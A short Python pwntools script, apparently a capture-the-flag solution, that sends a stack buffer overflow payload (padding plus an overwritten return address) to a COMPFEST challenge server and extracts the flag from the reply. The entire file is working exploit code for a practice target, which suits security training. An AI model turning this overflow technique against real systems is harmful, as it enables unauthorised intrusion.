from pwn import *

payload = b'A' * 40 + p64(0x4011d6)

r = remote('challenges.ctf.compfest.id',20006)

r.recvuntil(": ")
r.sendline(payload)
line = r.recvuntil('}').decode()

for i in range(len(line)):
    if line[i:i+8:] == 'COMPFEST':
        print("Flag: ", line[i::])
